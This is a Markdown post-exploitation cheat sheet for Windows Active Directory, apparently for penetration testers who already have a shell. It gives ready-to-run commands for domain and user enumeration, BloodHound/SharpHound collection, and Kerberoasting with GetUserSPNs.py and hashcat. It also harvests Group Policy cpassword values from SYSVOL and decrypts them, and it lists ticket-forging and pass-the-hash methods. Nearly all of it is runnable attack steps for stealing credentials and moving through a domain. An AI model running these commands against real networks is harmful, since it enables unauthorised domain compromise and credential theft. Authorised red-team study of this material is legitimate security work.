# Basics on what to do upon getting shell/rce


**Note:** Try as much as possible to [Live off the land](https://lolbas-project.github.io/)
___

## Just basic stuff

```batch
whoami /all
hostname
ipconfig /all
systeminfo
gpresult /R 
dir
tree /f /a
tasklist /V
net user
net user /domain
net user <username>
net user <username> /domain
net localgroup
net localgroup administrators
net groups /domain
net group "<group>" /domain
net group "domain admins" /domain
klist
```
___
## NLTest
   * Source: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)
       
```batch
nltest /dclist:<domain>
nltest /dsgetdc:<domain>
nltest /domain_trusts /all_trusts
```
___
## Powershell Enumeration
   * Source: [ired.team](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)

```powershell        
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', '<domain>')))).GetAllTrustRelationships()
```
___ 

## [Dumping credentials](/#dumping-credentials)
___
## Bloodhound (Sharphound) 

* Source: [hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)

1. On local machine  (~Kali)


```batch
git clone https://github.com/fox-it/BloodHound.py.git #Bloodhound.py does not have all the features compared to the original Sharphound ingestors
cd BloodHound.py/ && pip install .
bloodhound-python -d <domain> -u <username> -p <password> -gc <domain_controller> -c all

sudo apt install neo4j bloodhound
# Access neo4j and change the neo4j/neo4j default credentials.
# While neo4j is still running, run bloodhound
bloodhound
```

1. Sharphound Officialy supported ingestors
   * Running the official/supported Sharphound ingestors collects more information
       * although Bloodhound.py is good for most cases
   * Source: 
       * [Github](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors)
       * [ReadTheDocs](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
```powershell
# If logged in on a local user account but have domain user credentials, then on the command-line
C:\> runas /netonly /user:<DOMAIN>\<username> powershell.exe

# then on the spawned powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV -NoSaveCache
```

___
## General Attack methods
* Sources:
    * [Red Siege](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)
    * [Orange Cyberdefense](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png)
* Methods
     * Golden Ticket
         * Requires full domain compromise.
         * Used for persistenceand pivoting
     * Kerberoasting
         * Requires access as any user. 
         * Use to escalateand pivot
     * Silver Ticket
         * Requires service hash.
         * Use for persistenceand escalation
     * Pass-the-Ticket
         * Requires access as user.
         * Use to pivot
     * Over-Pass-the-Hash
         * Requires access as user.
         * Use to pivot
___

## Kerberoasting
* Source: 
    * [hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
    * [Tarlogic Security](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)
1. From Linux
    * Beware of time difference of the attacking machine (Kali) and the targeted Domain Controller
    ```bash
    GetUserSPNs.py -debug -request -outputfile TGS_file.txt -dc-ip <DC_IP_Address> <FQDN>/<username>
    ```

1. From Windows
    * Refer to [m0chan's blog](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
    ```batch
    hashcat64.exe -a 3 -m 13100 SPN.hash /wordlists/rockyou.txt
    ```

___

## Gathering Windows GPP passwords 

Source: [Pure Security](https://pure.security/dumping-windows-credentials/)

1. On target machine logged-on with a regular domain account
    ```batch
    findstr /S cpassword \\<domain_controller>\sysvol\*.xml
    ```
1. On local machine (~Kali)
    ```bash
    gpp-decrypt <cpassword_value>
    ```

___

## ADFind
* Source:
    * [redcanary](https://redcanary.com/threat-detection-report/techniques/domain-trust-discovery/)
    
```batch
adfind.exe -f objectclass=trusteddomain
adfind.exe -sc trustdmp
```
    
